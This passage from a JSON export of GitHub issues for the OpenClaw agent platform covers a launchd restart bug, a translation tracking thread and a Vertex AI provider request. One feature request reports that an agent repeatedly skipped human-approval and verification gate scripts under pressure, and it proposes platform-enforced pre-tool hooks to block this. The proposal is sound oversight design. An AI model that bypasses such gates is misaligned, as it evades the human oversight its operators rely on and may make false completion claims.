      "body": "## Bug\n\nAfter a SIGUSR1-based gateway restart (triggered by `config.patch`, `gateway restart`, or `openclaw update`), the launchd service frequently becomes unloaded. Subsequent `openclaw gateway restart` or `openclaw gateway stop && openclaw gateway start` commands fail with \"service not loaded.\"\n\n## Root Cause (suspected)\n\nThe gateway restart sends SIGUSR1, causing the process to exit and re-launch. When multiple restarts happen in quick succession (e.g. several `config.patch` calls), **launchd interprets the rapid exits as a crash loop** and silently unloads the service via its built-in throttling. Once unloaded, no restart commands work because launchd no longer knows about the service.\n\n## Reproduction\n\n1. Run several `config.patch` calls in a row (or multiple `openclaw gateway restart`)\n2. After 2-3 restarts, run `openclaw gateway restart` → fails with \"service not loaded\"\n3. `launchctl list | grep openclaw` shows no entry\n\n## Workaround\n\n```bash\nopenclaw gateway install && openclaw gateway restart\n```\n\n`gateway install` rewrites the plist and re-registers it with `launchctl load`/`launchctl bootstrap`, which always fixes it.\n\n## Expected Behavior\n\n- SIGUSR1 restarts should not cause launchd to unload the service\n- `openclaw update` should automatically re-register the launchd service (run `gateway install` internally)\n- Ideally, the restart mechanism should handle launchd's crash-loop throttling (e.g. add a small delay, or use a different restart approach)\n\n## Environment\n\n- **OS:** macOS 15 (Sequoia), Apple Silicon\n- **OpenClaw:** 2026.2.9\n- **Node:** v25.5.0\n- **Plist:** `~/Library/LaunchAgents/ai.openclaw.gateway.plist` with `KeepAlive: true`",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14161",
      "createdAt": "2026-02-11T16:12:04Z",
      "updatedAt": "2026-02-11T16:12:04Z",
      "author": "agplusman",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 14159,
      "title": "Feature Request: Pre-tool hooks (gate scripts that block tool execution)",
      "body": "## Problem\n\nAgents can be instructed to run gate scripts before taking certain actions (e.g., spawning sub-agents, reporting completion), but compliance is voluntary. The agent *chooses* to run the gate — it can skip it under pressure, urgency, or context loss.\n\n## Proposed Solution\n\nAdd a `preToolHooks` config option that executes a script before specified tool calls. If the script exits non-zero, the tool call is blocked.\n\n```json\n{\n  \"preToolHooks\": [\n    {\n      \"tools\": [\"exec\", \"sessions_spawn\"],\n      \"match\": \"codex|spawn\",\n      \"script\": \"bash ~/clawd/scripts/delegate-gate.sh\",\n      \"blockOnFail\": true\n    },\n    {\n      \"tools\": [\"message\"],\n      \"match\": \"done|deployed|shipped\",  \n      \"script\": \"bash ~/clawd/scripts/completion-gate.sh\",\n      \"blockOnFail\": true\n    }\n  ]\n}\n```\n\n## Why This Matters\n\nBen Freed (Baseplane) nailed it: 'You need to integrate it into the hooks so that the agent can't physically start or stop without running those.' \n\nCurrently, gates written in AGENTS.md or system prompts are suggestions the model can ignore. Evaluable scripts that the model must call are better, but still voluntary. True enforcement requires the platform to intercept tool calls and gate them.\n\nThis is the difference between:\n- **Level 1:** Text rules (agent should follow) — easily ignored\n- **Level 2:** Evaluable scripts (agent can call) — voluntary compliance  \n- **Level 3:** Platform hooks (agent can't bypass) — architectural enforcement\n\nOpenClaw is at Level 2 today. This feature request is for Level 3.\n\n## Use Cases\n\n1. **Delegate gate** — Require human approval before spawning coding agents (prevents wasted tokens on wrong-scoped work)\n2. **Completion gate** — Run verification before allowing 'done' messages (prevents false delivery claims)\n3. **Security gate** — Block exec calls matching dangerous patterns\n4. **Budget gate** — Block tool calls when daily token budget is exceeded\n\n## Context\n\nWe've been building an AI chief-of-staff on OpenClaw with 34+ cron jobs, evaluable gate scripts, and a recursive learning system. The #1 failure mode is the agent skipping gates under pressure. Three delegate gate violations in a single session (2026-02-10) led us to harden from text rules to evaluable scripts, but the fundamental gap remains: the agent can choose not to call the script.\n\ncc @steipete — would love your thoughts on feasibility. Happy to contribute a PR if there's appetite for this.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/14159",
      "createdAt": "2026-02-11T16:09:36Z",
      "updatedAt": "2026-02-11T16:09:36Z",
      "author": "matthewdecelles",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 3460,
      "title": "Internationalization (i18n) & Localization Support",
      "body": "## Summary\n\nWe've received multiple requests and PRs for internationalization (i18n) and localization support. We appreciate the community's interest in making Moltbot accessible to more users worldwide!\n\n**However, we don't currently have the bandwidth to properly support multiple languages.**\n\n## Why we're consolidating this\n\n- Maintaining translations requires ongoing effort as the product evolves\n- We need to establish a proper i18n architecture first\n- Quality translations need review by native speakers\n- Documentation, error messages, and UI all need coordinated translation\n\n## What this means\n\n- **New PRs adding translations will be closed** and pointed to this issue\n- **Issues requesting specific languages will be closed** as duplicates of this one\n- When we're ready, we'll announce the i18n initiative here\n\n## Languages requested (tracking)\n\n- [ ] Chinese (Simplified) - zh-CN\n- [ ] Chinese (Traditional) - zh-TW  \n- [ ] Portuguese (Brazilian) - pt-BR\n- [ ] Korean - ko\n- [ ] Japanese - ja\n- [ ] Spanish - es\n- [ ] French - fr\n- [ ] German - de\n- [ ] Vietnamese - vi\n- [ ] Filipino - fi\n\n**Want to add a language?** Comment below and we'll add it to the list.\n\n## Timeline\n\nNo ETA yet. We'll update this issue when we're ready to start accepting i18n contributions.\n\n---\n\n*This is the canonical issue for all i18n/localization requests. Thank you for your patience!*",
      "state": "open",
      "comments": 43,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460",
      "createdAt": "2026-01-28T16:47:02Z",
      "updatedAt": "2026-02-11T15:56:47Z",
      "author": "sebslight",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": []
      },
      "commentsData": [
        {
          "id": 3815126570,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3815126570",
          "createdAt": "2026-01-29T02:49:28Z",
          "updatedAt": "2026-01-29T02:49:28Z",
          "author": "sebslight",
          "body": "Adding Vietnamese (vi) to the tracking list per PR #3554."
        },
        {
          "id": 3815524665,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3815524665",
          "createdAt": "2026-01-29T05:11:55Z",
          "updatedAt": "2026-01-29T05:11:55Z",
          "author": "kenuoseclab",
          "body": "Chinese (Simplified) - zh-CN\n"
        },
        {
          "id": 3815527119,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3815527119",
          "createdAt": "2026-01-29T05:13:00Z",
          "updatedAt": "2026-01-29T05:13:00Z",
          "author": "thewilloftheshadow",
          "body": "Please do not link other implementations, we cannot verify them and this project carries too much of a security risk for that."
        },
        {
          "id": 3818025775,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3818025775",
          "createdAt": "2026-01-29T14:25:28Z",
          "updatedAt": "2026-01-29T14:25:28Z",
          "author": "superssr",
          "body": "Hi! We have a complete i18n implementation ready when you're accepting contributions:\n\n**Stats:**\n- 274 translation keys\n- 9 languages: EN, ZH, JA, KO, ES, FR, DE, PT, RU\n- Full Control UI coverage (~96%)\n- Type-safe with TypeScript\n\n**Architecture:**\n- Lightweight runtime (no heavy deps)\n- Proxy-based lazy loading\n- Language switcher component\n- Follows your existing code patterns\n\nBranch: `feat/i18n-chinese-support` at [superssr/moltbot](https://github.com/superssr/moltbot/tree/feat/i18n-chinese-support)\n\nHappy to adapt to whatever i18n architecture you establish. Just let us know!"
        },
        {
          "id": 3818039080,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3818039080",
          "createdAt": "2026-01-29T14:27:05Z",
          "updatedAt": "2026-01-29T14:27:05Z",
          "author": "superssr",
          "body": "Also happy to help design the i18n architecture itself if that would be useful. Our implementation includes:\n\n- Runtime translation function `t()` with dot-notation keys\n- Type-safe key validation\n- Nested JSON structure for organization\n- Proxy-based section metadata (lazy translation)\n- Browser locale detection + manual override\n- Persistent language preference\n\nCan provide an RFC or discuss architecture decisions if the team is interested."
        },
        {
          "id": 3822007952,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3822007952",
          "createdAt": "2026-01-30T05:55:35Z",
          "updatedAt": "2026-01-30T07:05:29Z",
          "author": "MarriotZ",
          "body": "If it's possible, I’d like to contribute to the Chinese part, maintaining translations for docs/UI, updating release notes, and helping with community support while keeping everything synced with upstream changes."
        },
        {
          "id": 3822071842,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3822071842",
          "createdAt": "2026-01-30T06:20:27Z",
          "updatedAt": "2026-01-30T06:20:27Z",
          "author": "is52hertz",
          "body": "I think using the **Crowdin** platform to let the community maintain translations is a great way to do it.\nModrinth et al. used this method and achieved remarkable results.\nIt allows easy review, submission, confirmation of translations, and engages the entire community, including native speakers."
        },
        {
          "id": 3822165962,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3822165962",
          "createdAt": "2026-01-30T06:52:50Z",
          "updatedAt": "2026-01-30T06:52:50Z",
          "author": "felirami",
          "body": "Hi! I’m a native Spanish speaker and happy to help translate or review es strings when the i18n effort begins. Please tag me when you’re ready."
        },
        {
          "id": 3823557609,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3823557609",
          "createdAt": "2026-01-30T12:38:19Z",
          "updatedAt": "2026-01-30T12:38:19Z",
          "author": "warengonzaga",
          "body": "Let's add Filipino - fil"
        },
        {
          "id": 3823560487,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3823560487",
          "createdAt": "2026-01-30T12:38:58Z",
          "updatedAt": "2026-01-30T12:38:58Z",
          "author": "warengonzaga",
          "body": "I can contribute and translate it into my native language."
        },
        {
          "id": 3824631943,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3824631943",
          "createdAt": "2026-01-30T16:35:16Z",
          "updatedAt": "2026-01-30T16:35:16Z",
          "author": "olwater",
          "body": "I completely understand the concern about maintenance overhead at this early stage. My primary motivation for proposing this now is to prevent 'hardcoding debt.' It is significantly easier to establish a translation pattern while the codebase is still manageable than to refactor hundreds of hardcoded strings later. This PR is designed to be non-invasive and 100% backward compatible—it provides the foundation for international growth without slowing down core development.\n\nI’m happy to simplify the implementation further if it helps, but I believe setting the standard early will benefit the project's long-term scalability. What do you think?"
        },
        {
          "id": 3827066087,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3827066087",
          "createdAt": "2026-01-31T01:16:34Z",
          "updatedAt": "2026-01-31T01:16:34Z",
          "author": "Lekler",
          "body": "No aguardo para contribuir com a traduçao pt-BR."
        },
        {
          "id": 3827305181,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3827305181",
          "createdAt": "2026-01-31T03:13:50Z",
          "updatedAt": "2026-01-31T03:13:50Z",
          "author": "warengonzaga",
          "body": "@sebslight kindly assign to me the translation for Filipino once we have a go signal for this update."
        },
        {
          "id": 3827882894,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3827882894",
          "createdAt": "2026-01-31T08:34:50Z",
          "updatedAt": "2026-01-31T08:34:50Z",
          "author": "mastwet",
          "body": "That's great!"
        },
        {
          "id": 3828023661,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3828023661",
          "createdAt": "2026-01-31T09:47:45Z",
          "updatedAt": "2026-01-31T09:47:45Z",
          "author": "xialonglee",
          "body": "@sebslight I'm ready to contribute the localization work for both Simplified Chinese (zh-CN) and Traditional Chinese (zh-TW).Please keep me updated of the localization plans.\n\nI have already finished the Chinese localization work with @lit/localize in my branch, and the results are great.\n\n<img width=\"877\" height=\"440\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/6569a331-f54e-4c57-a6b3-0d3af073b4d7\" />\n\n<img width=\"1776\" height=\"566\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/020891c5-7b9e-433b-afd4-3425d1fabb69\" />\n"
        },
        {
          "id": 3829232288,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3829232288",
          "createdAt": "2026-01-31T20:02:40Z",
          "updatedAt": "2026-01-31T20:02:40Z",
          "author": "jackspiering",
          "body": "I'm willing to help with Dutch (NL) translation. "
        },
        {
          "id": 3829553001,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3829553001",
          "createdAt": "2026-01-31T23:10:39Z",
          "updatedAt": "2026-01-31T23:13:36Z",
          "author": "shahzadbadar",
          "body": "I'm willing to own and maintain Urdu (ur-PK) and Arabic (ar-SA) translations. Happy to start with the Getting Started guide and FAQ."
        },
        {
          "id": 3829557758,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3829557758",
          "createdAt": "2026-01-31T23:13:12Z",
          "updatedAt": "2026-01-31T23:13:12Z",
          "author": "shahzadbadar",
          "body": "I would also like to suggest Hindi (hi-IN) as a high-priority language. India has one of the largest developer communities globally and there's strong demand."
        },
        {
          "id": 3832215162,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3832215162",
          "createdAt": "2026-02-01T22:55:46Z",
          "updatedAt": "2026-02-01T22:55:46Z",
          "author": "henrybottter",
          "body": "danish is mandatory :-)"
        },
        {
          "id": 3832318568,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3832318568",
          "createdAt": "2026-02-01T23:56:16Z",
          "updatedAt": "2026-02-01T23:56:16Z",
          "author": "dai",
          "body": "I'm willing to help with Japanese (ja-JP) translation.\n\nRight here🙋‍♂️"
        },
        {
          "id": 3834924437,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3834924437",
          "createdAt": "2026-02-02T12:48:03Z",
          "updatedAt": "2026-02-02T12:48:03Z",
          "author": "ChinskiKaczynski",
          "body": "I'm willing to help with Polish (pl-PL) translation."
        },
        {
          "id": 3836694946,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3836694946",
          "createdAt": "2026-02-02T17:39:16Z",
          "updatedAt": "2026-02-02T17:39:16Z",
          "author": "jyorko",
          "body": "again DELETE everything, start over from scratch, START with SECURITY."
        },
        {
          "id": 3836998887,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3836998887",
          "createdAt": "2026-02-02T18:42:39Z",
          "updatedAt": "2026-02-02T18:42:39Z",
          "author": "samithiwat",
          "body": "Hi! I'd be happy to help with Thai (th) translation. I'm a native speaker, and even though Thai isn't on your priority list yet, our community is growing and I think it would be valuable to have support for it. 🙌🏻"
        },
        {
          "id": 3837106395,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3837106395",
          "createdAt": "2026-02-02T19:08:50Z",
          "updatedAt": "2026-02-02T19:08:50Z",
          "author": "DiNaSoR",
          "body": "Arabic (عربي) language."
        },
        {
          "id": 3841465466,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3841465466",
          "createdAt": "2026-02-03T13:53:15Z",
          "updatedAt": "2026-02-03T13:53:15Z",
          "author": "yeager",
          "body": "I can do Swedish"
        },
        {
          "id": 3843115080,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3843115080",
          "createdAt": "2026-02-03T19:03:56Z",
          "updatedAt": "2026-02-03T19:03:56Z",
          "author": "vincentkoc",
          "body": "I'm happy to take on Turkish!"
        },
        {
          "id": 3844815395,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3844815395",
          "createdAt": "2026-02-04T02:01:22Z",
          "updatedAt": "2026-02-04T02:01:22Z",
          "author": "dkmin",
          "body": "I'm ready to contribute Korean (ko-KR) translation for docs and UI. Native speaker, happy to help with review and maintenance when the i18n initiative begins."
        },
        {
          "id": 3845224223,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3845224223",
          "createdAt": "2026-02-04T04:43:44Z",
          "updatedAt": "2026-02-04T04:43:44Z",
          "author": "dai",
          "body": "/> 私は日本語 (ja-JP) の翻訳をお手伝いします。\n> \n> ここだよ🙋‍♂️\n\n94e6fc246f762e74859264a082d5cd89a44857f4"
        },
        {
          "id": 3847911529,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3847911529",
          "createdAt": "2026-02-04T14:49:56Z",
          "updatedAt": "2026-02-04T14:49:56Z",
          "author": "GCancinoH",
          "body": "I can help with Spanish (es-mx) 🙃"
        },
        {
          "id": 3850814144,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3850814144",
          "createdAt": "2026-02-05T03:05:07Z",
          "updatedAt": "2026-02-05T03:05:07Z",
          "author": "ShaungBhone",
          "body": "I can help with Burmese (my-MM)"
        },
        {
          "id": 3853314171,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3853314171",
          "createdAt": "2026-02-05T12:22:42Z",
          "updatedAt": "2026-02-05T12:22:42Z",
          "author": "grabbou",
          "body": "Polish 👋"
        },
        {
          "id": 3853724053,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3853724053",
          "createdAt": "2026-02-05T13:37:13Z",
          "updatedAt": "2026-02-06T06:22:47Z",
          "author": "rexsuz",
          "body": "Hi, I am happy to help localize **Simplified Chinese** as a UK certified translators with 7 years of website/app/i18n localization experience. You may check my website for credentials: rex-su.com\n\nI have been using clawbot for days and it is so amazing. I also saw some posts on Chinese local social media where people don't know much English, so they can only research Chinese videos and tutorials. Unfortunately, those resources are very limited.\n\nIf you need a hand, just contact me. I want to make this tool known by more people.\n\nCheers\nRex Su\n"
        },
        {
          "id": 3858230363,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3858230363",
          "createdAt": "2026-02-06T06:11:43Z",
          "updatedAt": "2026-02-06T06:11:43Z",
          "author": "a1007479270",
          "body": "Support i18n internationalization, allowing more people to use openclaw.\n支持i18n国际化，让更多人使用openclaw。\n特别是中文支持。"
        },
        {
          "id": 3860804558,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3860804558",
          "createdAt": "2026-02-06T14:32:52Z",
          "updatedAt": "2026-02-06T14:32:52Z",
          "author": "maximbroos",
          "body": "Support for dutch would be niche but nice."
        },
        {
          "id": 3866436731,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3866436731",
          "createdAt": "2026-02-08T07:45:10Z",
          "updatedAt": "2026-02-08T07:45:10Z",
          "author": "johnakelly-yahoo-com",
          "body": "I've opened #11731 with AI-generated translations for all 309 docs in 8 languages: Japanese, Korean, Traditional Chinese, Brazilian Portuguese, Spanish, French, German, and Vietnamese — the languages most frequently requested in this thread.\n\nThese are intended as a starting point for community refinement, not a finished product. Each translated file includes `x-i18n` metadata with a source hash for staleness detection, and per-language glossaries ensure consistent terminology. The Python script used to generate the translations is included in the PR for transparency and reproducibility.\n\nNative speakers: reviews and corrections are very welcome, either as comments on the PR or as follow-up PRs."
        },
        {
          "id": 3867038823,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3867038823",
          "createdAt": "2026-02-08T11:36:12Z",
          "updatedAt": "2026-02-08T11:36:12Z",
          "author": "MeghanBao",
          "body": "I'm willing to help with German (DE) translation."
        },
        {
          "id": 3874887902,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3874887902",
          "createdAt": "2026-02-10T01:59:48Z",
          "updatedAt": "2026-02-10T02:16:54Z",
          "author": "johnakelly-yahoo-com",
          "body": "## 🌍 Documentation Localization Update: 20 Languages, 100% Coverage — Community Review Now Open on Crowdin\n\nFollowing up on my earlier comment about PR #11731 — I wanted to share a comprehensive update on where the documentation localization effort stands and how the community can get involved.\n\n### What's been done\n\nWe've completed a full programmatic localization of all 312+ OpenClaw documentation files into **20 languages**:\n\n| Language | Code | Language | Code |\n|----------|------|----------|------|\n| Arabic | ar | Korean | ko |\n| Burmese | my | Dutch | nl |\n| Danish | da | Polish | pl |\n| Filipino | fil | Portuguese (Brazilian) | pt-BR |\n| French | fr | Russian | ru |\n| German | de | Spanish | es |\n| Hindi | hi | Swedish | sv |\n| Japanese | ja | Thai | th |\n| Turkish | tr | Urdu (Pakistan) | ur |\n| Vietnamese | vi | Chinese Traditional | zh-TW |\n\nThis covers every language requested in this thread, plus several more from community DMs and related issues.\n\n### How it was done\n\n1. **AI-generated base translations** — All 312 English source documents were translated using OpenAI's `gpt-5.2-chat-latest` model with per-language glossaries to ensure consistent technical terminology (e.g., \"gateway,\" \"session,\" \"skill\" are preserved or translated consistently).\n\n2. **Crowdin as the translation management platform** — All source files and translations have been uploaded to Crowdin. Every string (28,742 per language, 574,840 total) has been translated and pre-approved as a starting baseline.\n\n3. **Synced with upstream** — The translations are current as of today, including the latest upstream changes (subagents docs rewrite, mermaid diagrams, Telegram video notes, device pairing plugins, security threat model updates, and more).\n\n### ✅ Community Review is Now Open\n\nThe Crowdin project is **public and open for anyone to join**:\n\n> **https://crowdin.com/project/66aa453b091ff31e16a4cecfeef31b17**\n\n**What you can do on Crowdin:**\n- **Review translations** in your native language — flag anything that sounds unnatural or incorrect\n- **Suggest improvements** — Crowdin lets you propose alternative translations that can be voted on\n- **Vote on suggestions** — Help surface the best translations from the community\n- **Report issues** — Use Crowdin's issue system to flag problems with specific strings\n\n**You don't need any special permissions** — just sign in with GitHub, Google, or email, pick your language, and start reviewing.\n\n### Why community review matters\n\nAI-generated translations are a strong starting point, but they're not perfect. Native speakers will catch:\n- Unnatural phrasing or overly literal translations\n- Technical terms that should remain in English vs. those that have standard local equivalents\n- Cultural nuances in tone and formality\n- Context-dependent translations where the AI may have guessed wrong\n\n### What happens next\n\n- Community corrections made in Crowdin will be periodically exported and pushed to the GitHub repo\n- Crowdin is now the **authoritative source** for all translation content\n- The translation infrastructure supports ongoing maintenance as docs evolve — when English source docs are updated, Crowdin automatically identifies new/changed strings for translation\n\n### For volunteers who offered to help in this thread\n\nThank you to everyone who volunteered — @dai @dkmin @felirami @warengonzaga @shahzadbadar @jackspiering @ChinskiKaczynski @samithiwat @yeager @vincentkoc @ShaungBhone @grabbou @rexsuz @xialonglee @MeghanBao @GCancinoH @Lekler @MarriotZ and others! The Crowdin project is ready for you. Your native-speaker reviews are exactly what's needed to take these translations from good to great.\n\n### Technical details\n\nFor anyone interested in the technical side:\n- PR #11731 on the `docs-i18n-8-languages` branch contains all translation files\n- Per-language glossaries ensure consistent terminology across all documents\n- The Crowdin project is configured with spellcheck QA (with a technical terms dictionary to avoid false positives)\n- Total OpenAI translation cost for the entire corpus: ~$24\n\nQuestions or feedback? Comment here or on PR #11731."
        },
        {
          "id": 3874982864,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3874982864",
          "createdAt": "2026-02-10T02:35:22Z",
          "updatedAt": "2026-02-10T02:35:22Z",
          "author": "johnakelly-yahoo-com",
          "body": "**Correction on cost figures**: My earlier comment stated ~$24 for the AI translation cost. That was only the Crowdin gap-fill phase. The actual total OpenAI API cost for the full project was approximately **$215** using `gpt-5.2-chat-latest` (after an initial $1,700 lesson in model selection with `gpt-5.2-pro`). Still remarkably affordable for 22 languages and 574,000+ strings, but I wanted to be accurate."
        },
        {
          "id": 3878721713,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3878721713",
          "createdAt": "2026-02-10T15:45:44Z",
          "updatedAt": "2026-02-10T15:45:44Z",
          "author": "finnbusse",
          "body": "I can also support translation to German and Danish"
        },
        {
          "id": 3879721234,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3879721234",
          "createdAt": "2026-02-10T17:40:16Z",
          "updatedAt": "2026-02-10T17:40:16Z",
          "author": "mhm77",
          "body": "I am happy to help regarding Arabic Language and RTL support."
        },
        {
          "id": 3881854369,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3881854369",
          "createdAt": "2026-02-11T03:00:39Z",
          "updatedAt": "2026-02-11T03:00:39Z",
          "author": "hnfnfl",
          "body": "I'm happy to help with Indonesian language `id`"
        },
        {
          "id": 3885237978,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3885237978",
          "createdAt": "2026-02-11T15:37:19Z",
          "updatedAt": "2026-02-11T15:37:19Z",
          "author": "18gogogo",
          "body": "Chinese (Traditional) - zh-TW"
        },
        {
          "id": 3885357288,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/3460#issuecomment-3885357288",
          "createdAt": "2026-02-11T15:56:47Z",
          "updatedAt": "2026-02-11T15:56:47Z",
          "author": "eject-dream",
          "body": "Hi everyone, I understand the team is currently focusing on core architecture and doesn't have the bandwidth for official i18n support yet.\n\nFor those who strictly need Chinese (or other languages) support right now, I created a lightweight script to patch/add localization without modifying the core codebase: https://github.com/eject-dream/openclaw-i18n-script\n\nIt's a temporary workaround intended to help the community while we wait for the official i18n architecture. Hope this helps ease the wait! 🦞"
        }
      ]
    },
    {
      "number": 6937,
      "title": "[Feature]: Add Vertex AI Anthropic provider (Claude on GCP)",
      "body": "## Summary\n\nAdd native support for **Claude models on Google Vertex AI**, enabling enterprise users to use Claude via their existing GCP infrastructure with Application Default Credentials (ADC) authentication.\n\n## Problem\n\nEnterprise users need Claude via Vertex AI for:\n- **Compliance/data residency** - Data stays within GCP\n- **Cost optimization** - Use existing GCP credits directly\n- **IAM integration** - Use existing GCP service accounts, no API key management\n- **Billing consolidation** - Single GCP invoice\n\nCurrently, there's no native way to use Claude via Vertex AI in OpenClaw.\n\n## Who this helps\n\n- **Enterprise GCP customers** with existing Vertex AI access\n- **Teams with GCP credits** who want to use them directly\n- **Organizations requiring data residency** (EU/APAC GCP regions)\n- **DevOps teams** preferring gcloud ADC over API key rotation\n\n## Proposed solution\n\nNew provider: `vertex-anthropic`\n\n**Config example:**\n```yaml\nagents:\n  defaults:\n    model:\n      primary: vertex-anthropic/claude-opus-4-5@20251101\n```\n\n**Environment setup:**\n```bash\ngcloud auth application-default login\nexport GOOGLE_CLOUD_PROJECT=my-project\nexport GOOGLE_CLOUD_LOCATION=us-east5  # or europe-west1, etc.\n```\n\n**Implementation approach:**\n1. Use `@anthropic-ai/sdk` with Vertex AI transport (similar to direct Anthropic provider)\n2. Auth via gcloud ADC (`google-auth-library`)\n3. Model catalog matching Vertex AI Model Garden availability\n4. Full feature parity: streaming, tools, vision, extended thinking\n\n## Technical notes\n\n- Vertex AI Claude uses same API format as direct Anthropic (just different auth/endpoint)\n- `@anthropic-ai/sdk` has built-in Vertex support via `AnthropicVertex` class\n- Existing `google-vertex` provider handles Gemini; this would be a parallel provider for Claude\n\n## Future extensibility\n\nThis implementation lays groundwork for broader **Vertex AI Model Garden** support, similar to AWS Bedrock's multi-provider approach:\n\n- **Current:** Claude (Anthropic) on Vertex AI\n- **Future potential:** Llama, Mistral, and other Model Garden models as they become available\n\nThe provider architecture can be designed to easily extend to additional Model Garden offerings, providing a unified GCP-native experience for multiple model families.\n\n## Prior work\n\n- Related closed issue: #4616\n- Related closed PR: #5994 (implementation exists, closed per triage policy)\n\nThe PR implementation is ready and tested on live GCP. Happy to resubmit after discussion.\n\n## Willingness to contribute\n\n✅ Ready to submit PR with:\n- Full implementation\n- Unit tests\n- Documentation\n- Tested on live GCP Vertex AI\n\nWould appreciate maintainer input on:\n1. Preferred provider naming (`vertex-anthropic` vs `google-vertex-claude`)\n2. Any concerns with the ADC auth approach\n3. Whether to post in #pr-thunderdome-dangerzone on Discord",
      "state": "open",
      "comments": 3,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/6937",
      "createdAt": "2026-02-02T06:42:56Z",
      "updatedAt": "2026-02-11T15:52:31Z",
      "author": "markbooch",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [
          "linux"
        ],
        "components": [
          "gateway",
          "config",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3840098697,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6937#issuecomment-3840098697",
          "createdAt": "2026-02-03T09:20:31Z",
          "updatedAt": "2026-02-03T09:20:31Z",
          "author": "ZerozhengCN",
          "body": "could you tell how to config with vertex for gemini? I think it is will be same ADC auth approach as you are using for claude. This issue bother me for a week already - - "
        },
        {
          "id": 3866876451,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6937#issuecomment-3866876451",
          "createdAt": "2026-02-08T10:07:19Z",
          "updatedAt": "2026-02-08T10:07:19Z",
          "author": "yuting0624",
          "body": "Hi! I'm interested in contributing to this feature.\nI've already tested the @anthropic-ai/vertex-sdk locally \nand confirmed it works with Claude Opus 4.6 on Vertex AI.\n\nHappy to help with the implementation if maintainers \nare open to accepting a PR for this feature."
        },
        {
          "id": 3885331441,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/6937#issuecomment-3885331441",
          "createdAt": "2026-02-11T15:52:31Z",
          "updatedAt": "2026-02-11T15:52:31Z",
          "author": "xingfanxia",
          "body": "> Hi! I'm interested in contributing to this feature. I've already tested the @anthropic-ai/vertex-sdk locally and confirmed it works with Claude Opus 4.6 on Vertex AI.\n> \n> Happy to help with the implementation if maintainers are open to accepting a PR for this feature.\n\nCould you share your implementation? Interested in using vertex in my project"
        }
      ]
    },
    {
      "number": 12129,
      "title": "Feature request: outbound text transform hook for channel plugins",
